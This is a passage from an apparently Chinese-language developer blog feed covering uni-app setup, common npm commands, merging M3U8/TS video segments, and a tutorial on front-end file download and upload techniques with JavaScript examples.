<li>需要先配置小程序 ide 的相关路径：工具&gt;设置&gt;运行配置&gt;小程序运行配置&gt;微信开发者工具路径</li>
</ul>
<p><img src="https://cdn.huatree.top/image-20220430063717154.png" alt="image-20220430063717154"></p>
<ul>
<li><p>配置项目根目录下的<code>manifest.json</code>文件&gt;微信小程序配置&gt;微信小程序<code>AppID</code></p>
</li>
<li><p>打开微信开发者工具&gt;设置&gt;安全&gt;服务端口</p>
</li>
</ul>
<h2 id="如何学习"><a href="#如何学习" class="headerlink" title="如何学习"></a>如何学习</h2><p><a href="https://uniapp.dcloud.io/resource.html">推荐官网步骤不迷路</a></p>
<h2 id="HBuilderX-常用插件"><a href="#HBuilderX-常用插件" class="headerlink" title="HBuilderX 常用插件"></a>HBuilderX 常用插件</h2><blockquote>
<p>插件安装需要登录 Dcloud 账号</p>
</blockquote>
<p>在哪儿下载插件安装？<a href="https://ext.dcloud.net.cn/">详见官网</a>，当然，也可以通过 HBuilderX&gt;工具&gt;插件安装打开。</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">easy-git <span class="comment"># Git源代码管理工具</span></span><br><span class="line">scss/sass编译</span><br><span class="line">prettier <span class="comment"># 格式化less、sass、vue、stylus(vue内嵌)、ts、yaml代码</span></span><br></pre></td></tr></table></figure>

<p>新建项目时，是没有自动<code>git init</code>及<code>.gitignore</code>文件的，第一次需要安装<code>easy-git</code>插件，重启 HBuilderX 才有。</p>
<h2 id="友情链接"><a href="#友情链接" class="headerlink" title="友情链接"></a>友情链接</h2><p>[1] <a href="https://gitcode.net/Ksy007/xingyuan-shop">星元商城微信小程序 demo</a></p>
<p>[2] <a href="https://ask.dcloud.net.cn/article/114">Native.js 示例汇总</a></p>
]]></content>
      <categories>
        <category>成长经历</category>
      </categories>
      <tags>
        <tag>uni-app</tag>
      </tags>
  </entry>
  <entry>
    <title>npm常用命令</title>
    <url>/2021/09/12/20210912-npm%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/</url>
    <content><![CDATA[<p><img src="https://cdn.huatree.top/image-20220507212813517.png" alt="image-20220507212813517"></p>
<span id="more"></span>

<h2 id="UNMET-PEER-DEPENDENCY-xxx"><a href="#UNMET-PEER-DEPENDENCY-xxx" class="headerlink" title="UNMET PEER DEPENDENCY @xxx"></a>UNMET PEER DEPENDENCY @xxx</h2><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 简洁查看全局依赖库信息</span></span><br><span class="line">npm <span class="built_in">ls</span> --depth=0 -g</span><br><span class="line"><span class="comment"># 简单查看项目依赖库的信息</span></span><br><span class="line">npm <span class="built_in">ls</span> --depth 0</span><br><span class="line"><span class="comment"># 查看当前是否有任何（或特定）已安装的依赖包已过时</span></span><br><span class="line">npm outdated</span><br><span class="line"><span class="comment"># 查看某个依赖包的所有版本</span></span><br><span class="line">npm view [pkg name] versions</span><br></pre></td></tr></table></figure>

<div class="note warning"><p>简单查看项目依赖库的信息，如果遇到 UNMET PEER DEPENDENCY @xxx，会列出来并给出修复提示。</p>
</div>

<h2 id="package-json-的包依赖关系"><a href="#package-json-的包依赖关系" class="headerlink" title="package.json 的包依赖关系"></a>package.json 的包依赖关系</h2><p><code>^version</code>：与版本兼容，并非指定的版本，具体版本在 package-lock.json 文件可查，也可以在终端输入下面的命令查看</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">npm <span class="built_in">ls</span> [pkg name]</span><br><span class="line"><span class="comment"># npm查看全局安装包</span></span><br><span class="line">npm <span class="built_in">ls</span> --global</span><br></pre></td></tr></table></figure>

<div class="note warning"><p>请不要在您的<code>dependencies</code>对象中放置测试工具或转译器。</p>
</div>

<h2 id="配置镜像源"><a href="#配置镜像源" class="headerlink" title="配置镜像源"></a>配置镜像源</h2><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 查看所有配置信息</span></span><br><span class="line">npm config <span class="built_in">ls</span> -l</span><br><span class="line"><span class="comment"># 查看镜像源</span></span><br><span class="line">npm get registry</span><br><span class="line"><span class="comment"># 设置镜像源</span></span><br><span class="line">npm config <span class="built_in">set</span> registry=https://registry.npmmirror.com</span><br></pre></td></tr></table></figure>

<h2 id="指定依赖库版本的更新"><a href="#指定依赖库版本的更新" class="headerlink" title="指定依赖库版本的更新"></a>指定依赖库版本的更新</h2><p>需要先卸载该依赖库，再安装</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">npm uninstall xxx</span><br><span class="line">npm i xxx@x.x.x &lt;-D&gt;</span><br></pre></td></tr></table></figure>

<p>&lt;-D&gt;：如果是开发依赖，需加上<code>-D</code></p>
<h2 id="相关链接"><a href="#相关链接" class="headerlink" title="相关链接"></a>相关链接</h2><p>[1] <a href="https://docs.npmjs.com/cli/v8/commands">npm Docs</a></p>
<p>[2] <a href="https://gitee.com/link?target=https://blog.csdn.net/qq_24956515/article/details/72829051">ng2 依赖库平滑升级方案</a></p>
<p>[3] <a href="https://gitee.com/link?target=https://www.npmjs.cn/cli/ls/">npm-ls</a></p>
<p>[4] <a href="https://gitee.com/link?target=https://www.npmjs.cn/cli/outdated/">npm-outdated</a></p>
<p>[5] <a href="https://gitee.com/link?target=https://www.npmjs.cn/cli/view/">npm view</a></p>
<p>[6] <a href="https://gitee.com/link?target=https://www.npmjs.cn/files/package.json/%23dependencies">package.json-dependencies</a></p>
<p>[7] <a href="https://gitee.com/link?target=https://www.npmjs.cn/misc/semver/">npm - semver</a></p>
<p>[8] <a href="https://www.runoob.com/w3cnote/npm-switch-repo.html">npm 切换镜像站点</a></p>
]]></content>
      <categories>
        <category>工作点滴</category>
      </categories>
      <tags>
        <tag>npm</tag>
      </tags>
  </entry>
  <entry>
    <title>M3U8-Downloader视频下载合并转换</title>
    <url>/2021/09/25/20210925-M3U8-Downloader%E8%A7%86%E9%A2%91%E4%B8%8B%E8%BD%BD%E5%90%88%E5%B9%B6%E8%BD%AC%E6%8D%A2/</url>
    <content><![CDATA[<p>TS 视频或者 M3U8 怎么合并呢？这里教你下载各大平台的 M3U8 视频点播源和直播源并且无损合并 MP4。</p>
<p>TS 视频流就是 HLS 协议中的一个几秒钟的片段，M3U8 文件是这些片段的一个目录一个索引文件。弄清楚这些就好理解接下来为啥要合并 TS 视频了。</p>
<p><img src="https://tools.heisir.cn/HLSDownload/resource/HLSDownloadShow-3-1.gif" alt="top"></p>
<span id="more"></span>

<blockquote>
<p><a href="https://github.com/HeiSir2014/M3U8-Downloader">M3U8-Downloader</a>为开源软件，跨平台，完全免费。支持多线程、断点续传、加密视频下载缓存。适用于各大直播平台和点播平台。</p>
</blockquote>
<p>HTTP Live Streaming（缩写是 HLS）是一个由苹果公司提出的基于 HTTP 的流媒体网络传输协议。是苹果公司 QuickTime X 和 iPhone 软件系统的一部分。 它的工作原理是把整个流分成一个个小的基于 HTTP 的文件来下载，每次只下载一些。当媒体流正在播放时，客户端可以选择从许多不同的备用源中以不同的速率下载同样的资源，允许流媒体会话适应不同的数据速率。</p>
<h2 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h2><p><a href="https://tools.heisir.cn/HLSDownload/">详见官网</a></p>
<h2 id="TS-文件合并"><a href="#TS-文件合并" class="headerlink" title="TS 文件合并"></a>TS 文件合并</h2><p>M3U8-Downloader 新版本支持 TS 文件自动合并，无需手动命令合并。</p>
<h3 id="旧版本"><a href="#旧版本" class="headerlink" title="旧版本"></a>旧版本</h3><p><strong>Windows</strong>：在所保存的<code>.ts</code>文件目录下，打开<code>cmd</code>，输入如下命令：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">copy/b *.ts mergedFileName.mp4</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>生活滋味</category>
      </categories>
      <tags>
        <tag>工具</tag>
      </tags>
  </entry>
  <entry>
    <title>前端文件上传下载</title>
    <url>/2021/09/27/20210927-%E5%89%8D%E7%AB%AF%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E4%B8%8B%E8%BD%BD/</url>
    <content><![CDATA[<p>前端文件上传下载，这里总有一种适合你！</p>
<p><img src="https://cdn.huatree.top/image-20220917233226567.png" alt="image-20220917233226567"></p>
<span id="more"></span>

<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>遇到前端文件上传下载，可能会先想到前人已经写好的轮子（模块或者第三方库），引入就能用了。如果想进一步了解，可以接着往下看，本文主要讲述前端文件上传下载，可能涉及到前端文件的数据类型，例如<code>ArrayBuffer, TypedArray, DataView, Blob, File, Base64, FileReader</code>等。</p>
<h2 id="下载"><a href="#下载" class="headerlink" title="下载"></a>下载</h2><h3 id="超链接下载"><a href="#超链接下载" class="headerlink" title="超链接下载"></a>超链接下载</h3><p>最常见的一种简单实现方式。</p>
<p><strong>下载本地资源</strong>:</p>
<p>给超链接加上 <a href="https://developer.mozilla.org/zh-CN/docs/Web/API/HTMLAnchorElement/download">download 属性</a></p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;./img/logo.png&quot;</span> <span class="attr">download</span>=<span class="string">&quot;testDownload&quot;</span>&gt;</span>直接下载图片<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 创建一个&lt;a&gt;&lt;/a&gt;标签</span></span><br><span class="line"><span class="keyword">const</span> a = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line"><span class="comment">// 给a标签的href属性值加上地址,注意:这里是绝对路径,不用加 点.</span></span><br><span class="line">a.<span class="property">href</span> = <span class="string">&#x27;/xxxTemplate.xlsx&#x27;</span></span><br><span class="line"><span class="comment">// 设置下载文件文件名,这里加上.xlsx指定文件类型,pdf文件就指定.fpd即可</span></span><br><span class="line">a.<span class="property">download</span> = <span class="string">&#x27;xxx模板.xlsx&#x27;</span></span><br><span class="line"><span class="comment">// 障眼法藏起来a标签</span></span><br><span class="line">a.<span class="property">style</span>.<span class="property">display</span> = <span class="string">&#x27;none&#x27;</span></span><br><span class="line"><span class="comment">// 将a标签追加到文档对象中</span></span><br><span class="line"><span class="variable language_">document</span>.<span class="property">body</span>.<span class="title function_">appendChild</span>(a)</span><br><span class="line"><span class="comment">// 模拟点击了&lt;a&gt;标签,会触发&lt;a&gt;标签的href的读取,浏览器就会自动下载了</span></span><br><span class="line">a.<span class="title function_">click</span>()</span><br><span class="line"><span class="comment">// 一次性的,用完就删除a标签</span></span><br><span class="line">a.<span class="title function_">remove</span>()</span><br></pre></td></tr></table></figure>

<p><strong>下载服务器资源</strong>：</p>
<p>这就需要用到<code>Blob url</code>或者<code>Base64 data</code>。</p>
<p><code>Blob url</code>，可以使用<code>window.URL.createObjectURL(blob)</code>方法生成 <code>Blob url</code>，然后将<code>Blob url</code>赋值给超链接的<code>href</code>属性，然后模拟点击超链接进行下载。</p>
<p><code>Blob url</code>，简单的理解一下就是将一个<code>file</code>或<code>Blob</code>类型的对象转为<code>UTF-8</code>、<code>UTF-16</code>等字符串，并保存在当前操作的<code>document</code>下，存储在内存中。</p>
<p>生成<code>blob url</code>使用的方法是<code>URL.createObjectURL(file/blob)</code>。清除方式只有页面<code>unload()</code>事件或者使用<code>URL.revokeObjectURL(objectURL)</code>手动清除 。</p>
<p><code>Base64 data</code>，可以直接把<code>Base64 data</code>赋值给超链接的<code>href</code>属性，然后模拟点击超链接进行下载。</p>
<p>下面我将模拟后端返回<code>ArrayBuffer</code>、<code>Blob</code>对象和<code>base64数据</code>来实现超链接方式下载。</p>
<p><strong>后端返回 <code>ArrayBuffer</code></strong>:</p>
<p>因为生成<code>Blob url</code>的参数只能是<code>Blob</code>或<code>File</code>对象，所以对于后端返回的<code>ArrayBuffer</code>我们需要先转成<code>Blob</code>或者<code>File</code>对象然后再生成<code>Blob url</code>。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">aDownload1</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="comment">// 模拟后端返回 ArrayBuffer</span></span><br><span class="line">  <span class="keyword">const</span> str = <span class="string">&#x27;hello huatree!&#x27;</span></span><br><span class="line">  <span class="keyword">let</span> ab = <span class="keyword">new</span> <span class="title class_">ArrayBuffer</span>(str.<span class="property">length</span>)</span><br><span class="line">  <span class="keyword">let</span> ia = <span class="keyword">new</span> <span class="title class_">Uint8Array</span>(ab)</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; str.<span class="property">length</span>; i++) &#123;</span><br><span class="line">    ia[i] = str.<span class="title function_">charCodeAt</span>(i)</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">const</span> a = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">  <span class="comment">// 设置文件名为test</span></span><br><span class="line">  a.<span class="property">download</span> = <span class="string">&#x27;test&#x27;</span></span><br><span class="line">  <span class="comment">// 将 ArrayBuffer 转成Blob，这里也可以转成File对象。</span></span><br><span class="line">  <span class="keyword">const</span> blob = <span class="keyword">new</span> <span class="title class_">Blob</span>([ia], &#123; <span class="attr">type</span>: <span class="string">&#x27;text/plain&#x27;</span> &#125;)</span><br><span class="line">  <span class="comment">// 生成Blob url。这里可以使用Blob对象或者File对象</span></span><br><span class="line">  a.<span class="property">href</span> = <span class="variable language_">window</span>.<span class="property">URL</span>.<span class="title function_">createObjectURL</span>(blob)</span><br><span class="line">  a.<span class="property">style</span>.<span class="property">display</span> = <span class="string">&#x27;none&#x27;</span></span><br><span class="line">  <span class="variable language_">document</span>.<span class="property">body</span>.<span class="title function_">appendChild</span>(a)</span><br><span class="line">  a.<span class="title function_">click</span>()</span><br><span class="line">  <span class="comment">// 释放内存</span></span><br><span class="line">  <span class="variable language_">window</span>.<span class="property">URL</span>.<span class="title function_">revokeObjectURL</span>(a.<span class="property">href</span>)</span><br><span class="line">  <span class="comment">// 移除a元素</span></span><br><span class="line">  <span class="variable language_">document</span>.<span class="property">body</span>.<span class="title function_">removeChild</span>(a)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>后端返回 Blob</strong>:</p>
<p>直接生成<code>Blob url</code>就可以了。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">aDownload2</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="comment">// 模拟后端返回 Blob</span></span><br><span class="line">  <span class="keyword">const</span> blob = <span class="keyword">new</span> <span class="title class_">Blob</span>([<span class="string">&#x27;hello&#x27;</span>, <span class="string">&#x27;randy&#x27;</span>], &#123; <span class="attr">type</span>: <span class="string">&#x27;text/plain&#x27;</span> &#125;)</span><br><span class="line"></span><br><span class="line">  <span class="keyword">const</span> a = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">  <span class="comment">// 设置文件名为test</span></span><br><span class="line">  a.<span class="property">download</span> = <span class="string">&#x27;test&#x27;</span></span><br><span class="line">  <span class="comment">// 直接生成Blob url。这里可以使用Blob对象或者File对象</span></span><br><span class="line">  a.<span class="property">href</span> = <span class="variable language_">window</span>.<span class="property">URL</span>.<span class="title function_">createObjectURL</span>(blob)</span><br><span class="line">  a.<span class="property">style</span>.<span class="property">display</span> = <span class="string">&#x27;none&#x27;</span></span><br><span class="line">  <span class="variable language_">document</span>.<span class="property">body</span>.<span class="title function_">appendChild</span>(a)</span><br><span class="line">  a.<span class="title function_">click</span>()</span><br><span class="line">  <span class="comment">// 释放内存</span></span><br><span class="line">  <span class="variable language_">window</span>.<span class="property">URL</span>.<span class="title function_">revokeObjectURL</span>(a.<span class="property">href</span>)</span><br><span class="line">  <span class="comment">// 移除a元素</span></span><br><span class="line">  <span class="variable language_">document</span>.<span class="property">body</span>.<span class="title function_">removeChild</span>(a)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>后端返回<code>base64</code></strong>:</p>
<p>这种情况少见。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">async</span> <span class="keyword">function</span> <span class="title function_">aDownload3</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="comment">// 模拟后端返回 Base64</span></span><br><span class="line">  <span class="comment">// 这里就是将本地的图片转为base64</span></span><br><span class="line">  <span class="keyword">const</span> b1 = <span class="keyword">await</span> <span class="title function_">img2base64</span>(<span class="string">&#x27;./imgs/logo.png&#x27;</span>)</span><br><span class="line"></span><br><span class="line">  <span class="keyword">const</span> a = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">  a.<span class="property">download</span> = <span class="string">&#x27;test&#x27;</span></span><br><span class="line">  <span class="comment">// 给超链接赋值Base64也是可以的。</span></span><br><span class="line">  a.<span class="property">href</span> = b1</span><br><span class="line">  a.<span class="property">style</span>.<span class="property">display</span> = <span class="string">&#x27;none&#x27;</span></span><br><span class="line">  <span class="variable language_">document</span>.<span class="property">body</span>.<span class="title function_">appendChild</span>(a)</span><br><span class="line">  a.<span class="title function_">click</span>()</span><br><span class="line">  <span class="comment">// 移除超链接</span></span><br><span class="line">  <span class="variable language_">document</span>.<span class="property">body</span>.<span class="title function_">removeChild</span>(a)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="showSaveFilePicker-API-下载"><a href="#showSaveFilePicker-API-下载" class="headerlink" title="showSaveFilePicker API 下载"></a>showSaveFilePicker API 下载</h3><p><a href="https://developer.mozilla.org/en-US/docs/Web/API/window/showSaveFilePicker">showSaveFilePicker</a> 是一个新的<code>api</code>，调用该方法后会显示允许用户选择保存路径的文件选择器。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="title class_">FileSystemFileHandle</span> = <span class="title class_">Window</span>.<span class="title function_">showSaveFilePicker</span>(options)</span><br></pre></td></tr></table></figure>

<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">async</span> <span class="keyword">function</span> <span class="title function_">download3</span>(<span class="params">blob, filename</span>) &#123;</span><br><span class="line">  <span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="keyword">const</span> handle = <span class="keyword">await</span> <span class="variable language_">window</span>.<span class="title function_">showSaveFilePicker</span>(&#123;</span><br><span class="line">      <span class="attr">suggestedName</span>: filename,</span><br><span class="line">      <span class="attr">types</span>: [</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">description</span>: <span class="string">&#x27;text file&#x27;</span>,</span><br><span class="line">          <span class="attr">accept</span>: &#123;</span><br><span class="line">            <span class="string">&#x27;text/plain&#x27;</span>: [<span class="string">&#x27;.txt&#x27;</span>]</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">description</span>: <span class="string">&#x27;jpeg file&#x27;</span>,</span><br><span class="line">          <span class="attr">accept</span>: &#123;</span><br><span class="line">            <span class="string">&#x27;image/jpeg&#x27;</span>: [<span class="string">&#x27;.jpeg&#x27;</span>]</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      ]</span><br><span class="line">    &#125;)</span><br><span class="line">    <span class="keyword">const</span> writable = <span class="keyword">await</span> handle.<span class="title function_">createWritable</span>()</span><br><span class="line">    <span class="keyword">await</span> writable.<span class="title function_">write</span>(blob)</span><br><span class="line">    <span class="keyword">await</span> writable.<span class="title function_">close</span>()</span><br><span class="line">    <span class="keyword">return</span> handle</span><br><span class="line">  &#125; <span class="keyword">catch</span> (err) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">error</span>(err.<span class="property">name</span>, err.<span class="property">message</span>)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">showSaveFilePickerDownload</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="comment">// 模拟blob文件</span></span><br><span class="line">  <span class="keyword">const</span> blob = <span class="keyword">new</span> <span class="title class_">Blob</span>([<span class="string">&#x27;hello&#x27;</span>, <span class="string">&#x27;randy&#x27;</span>], &#123; <span class="attr">type</span>: <span class="string">&#x27;text/plain&#x27;</span> &#125;)</span><br><span class="line"></span><br><span class="line">  <span class="title function_">download3</span>(blob, <span class="string">&#x27;test.txt&#x27;</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>当你点击下载后会出现文件选择界面，及你建议的文件名和文件类型选择。</p>
<p>相比 <strong>a 标签下载</strong> 的方式，<code>showSaveFilePicker API</code> 允许你选择文件的下载目录、选择文件的保存格式和更改存储的文件名称。不过可惜的是该 <code>API</code> 目前的兼容性还不是很好。<a href="https://caniuse.com/?search=showSaveFilePicker">详见</a></p>
<p>注意这种下载方式下载的文件不会出现在浏览器下载列表。</p>
<h3 id="FileSaver-下载"><a href="#FileSaver-下载" class="headerlink" title="FileSaver 下载"></a>FileSaver 下载</h3><p><a href="https://github.com/eligrey/FileSaver.js">FileSaver.js</a>是在客户端保存文件的解决方案，非常适合在客户端上生成文件的 Web 应用程序。</p>
<table>
<thead>
<tr>
<th>Browser</th>
<th>Constructs as</th>
<th>Filenames</th>
<th>Max Blob Size</th>
<th>Dependencies</th>
</tr>
</thead>
<tbody><tr>
<td>Firefox 20+</td>
<td>Blob</td>
<td>Yes</td>
<td>800 MiB</td>
<td>None</td>
</tr>
<tr>
<td>Firefox &lt; 20</td>
<td>data: URI</td>
<td>No</td>
<td>n&#x2F;a</td>
<td><a href="https://github.com/eligrey/Blob.js">Blob.js</a></td>
</tr>
<tr>
<td>Chrome</td>
<td>Blob</td>
<td>Yes</td>
<td><a href="https://bugs.chromium.org/p/chromium/issues/detail?id=375297#c107">2GB</a></td>
<td>None</td>
</tr>
<tr>
<td>Chrome for Android</td>
<td>Blob</td>
<td>Yes</td>
<td><a href="https://bugs.chromium.org/p/chromium/issues/detail?id=375297#c107">RAM&#x2F;5</a></td>
<td>None</td>
</tr>
<tr>
<td>Edge</td>
<td>Blob</td>
<td>Yes</td>
<td>?</td>
<td>None</td>
</tr>
<tr>
<td>IE 10+</td>
<td>Blob</td>
<td>Yes</td>
<td>600 MiB</td>
<td>None</td>
</tr>
<tr>
<td>Opera 15+</td>
<td>Blob</td>
<td>Yes</td>
<td>500 MiB</td>
<td>None</td>
</tr>
<tr>
<td>Opera &lt; 15</td>
<td>data: URI</td>
<td>No</td>
<td>n&#x2F;a</td>
<td><a href="https://github.com/eligrey/Blob.js">Blob.js</a></td>
</tr>
<tr>
<td>Safari 6.1+*</td>
<td>Blob</td>
<td>No</td>
<td>?</td>
<td>None</td>
</tr>
<tr>
<td>Safari &lt; 6</td>
<td>data: URI</td>
<td>No</td>
<td>n&#x2F;a</td>
<td><a href="https://github.com/eligrey/Blob.js">Blob.js</a></td>
</tr>
<tr>
<td>Safari 10.1+</td>
<td>Blob</td>
<td>Yes</td>
<td>n&#x2F;a</td>
<td>None</td>
</tr>
</tbody></table>
<p>对于<code>FileSaver.js</code> 我们主要需要记住他的这个<code>saveAs</code>方法。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="title class_">FileSaver</span>.<span class="title function_">saveAs</span>(<span class="title class_">Blob</span>/<span class="title class_">File</span>/<span class="title class_">Url</span>, optional <span class="title class_">DOMString</span> filename, optional <span class="title class_">Object</span> &#123; autoBom &#125;)</span><br></pre></td></tr></table></figure>

<h3 id="jszip-压缩下载"><a href="#jszip-压缩下载" class="headerlink" title="jszip 压缩下载"></a>jszip 压缩下载</h3><p><a href="https://github.com/Stuk/jszip">jszip</a>可以让下载的文件转为<code>zip</code>格式。</p>
<p><code>jszip</code>自己不具备下载功能，他只是提供了将文件压缩成<code>zip</code>包的功能，下载的话我们还是需要借助前面所说的<code>FileSaver.js</code>。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 创建 JSZip 对象</span></span><br><span class="line"><span class="keyword">var</span> zip = <span class="keyword">new</span> <span class="title class_">JSZip</span>()</span><br><span class="line"></span><br><span class="line"><span class="comment">// 把文件添加到前面创建的 JSZip 对象中，可以添加多个</span></span><br><span class="line">zip.<span class="title function_">file</span>(<span class="string">&#x27;Hello.txt&#x27;</span>, <span class="string">&#x27;Hello World\n&#x27;</span>)</span><br><span class="line"><span class="comment">// 添加第二个文件，文件是blob对象</span></span><br><span class="line">zip.<span class="title function_">file</span>(<span class="string">&#x27;Hello2.txt&#x27;</span>, blob)</span><br><span class="line"><span class="comment">// 添加第二个文件，文件是file对象</span></span><br><span class="line">zip.<span class="title function_">file</span>(<span class="string">&#x27;Hello3.txt&#x27;</span>, file)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 生成 JSZip 文件</span></span><br><span class="line">zip.<span class="title function_">generateAsync</span>(&#123; <span class="attr">type</span>: <span class="string">&#x27;blob&#x27;</span> &#125;).<span class="title function_">then</span>(<span class="keyword">function</span> (<span class="params">content</span>) &#123;</span><br><span class="line">  <span class="comment">// 这里需要用到上面说的 FileSaver.js</span></span><br><span class="line">  <span class="title class_">FileSaver</span>.<span class="title function_">saveAs</span>(content, <span class="string">&#x27;example.zip&#x27;</span>)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>

<h3 id="附件形式下载"><a href="#附件形式下载" class="headerlink" title="附件形式下载"></a>附件形式下载</h3><p>我们平时在浏览器输入图片链接地址，为什么有的图片是预览而有的却是直接下载呢？</p>
<p>这个链接在浏览器打开是<a href="https://p9-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/ab5e763e993f4bfab3c2ce3ef2935ec6~tplv-k3u1fbpfcp-watermark.image">直接预览</a></p>
<p>这个链接在浏览器打开是<a href="http://pic.96weixin.com/ueditor/20200511/1589185236200665.jpg?x-oss-process=image/resize,m_lfit,w_120">直接下载</a></p>
<p>这里就涉及到附件形式下载了。</p>
<p>我们可以通过设置 Content-Disposition 响应头来指示响应的内容以何种形式展示，是以内联（inline）的形式，还是以附件（attachment）的形式下载并保存到本地。filename 用来设置下载的文件的文件名。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="title class_">Content</span>-<span class="title class_">Disposition</span>: inline</span><br><span class="line"><span class="title class_">Content</span>-<span class="title class_">Disposition</span>: attachment</span><br><span class="line"><span class="title class_">Content</span>-<span class="title class_">Disposition</span>: attachment; filename=<span class="string">&quot;filename.jpg&quot;</span></span><br></pre></td></tr></table></figure>

<p>打开控制台可以发现，我们上面的第二张图就是设置了<code>Content-Disposition</code>响应头，所以我们输入完图片链接后会以附件的形式直接下载。</p>
<p><img src="https://cdn.huatree.top/image-20220917231432235.png" alt="image-20220917231432235"></p>
<p>了解更多，<a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Content-Disposition">详见</a></p>
<h2 id="上传"><a href="#上传" class="headerlink" title="上传"></a>上传</h2><p>不管使用何种方式，都是先获取到文件对象然后在利用表单<code>FormData</code>对象进行传输。</p>
<h3 id="单文件上传"><a href="#单文件上传" class="headerlink" title="单文件上传"></a>单文件上传</h3><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">id</span>=<span class="string">&quot;uploadFile1&quot;</span> <span class="attr">type</span>=<span class="string">&quot;file&quot;</span> <span class="attr">accept</span>=<span class="string">&quot;image/*&quot;</span> /&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">  <span class="keyword">const</span> <span class="title function_">upload</span> = (<span class="params"></span>) =&gt; &#123;</span></span><br><span class="line"><span class="language-javascript">    <span class="comment">// 获取上传的input元素</span></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">const</span> uploadFileEle = <span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&#x27;#uploadFile1&#x27;</span>)</span></span><br><span class="line"><span class="language-javascript">    <span class="comment">// 获取文件</span></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">const</span> files = uploadFileEle.<span class="property">files</span></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">let</span> formData = <span class="keyword">new</span> <span class="title class_">FormData</span>()</span></span><br><span class="line"><span class="language-javascript">    formData.<span class="title function_">append</span>(fieldName, files[<span class="number">0</span>])</span></span><br><span class="line"><span class="language-javascript">    <span class="comment">// 进行请求</span></span></span><br><span class="line"><span class="language-javascript">    <span class="comment">// axios.post(url, formData)</span></span></span><br><span class="line"><span class="language-javascript">  &#125;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="多文件上传"><a href="#多文件上传" class="headerlink" title="多文件上传"></a>多文件上传</h3><p>在<code>input</code>元素里面添加<code>multiple</code>属性，表示支持多文件上传。</p>
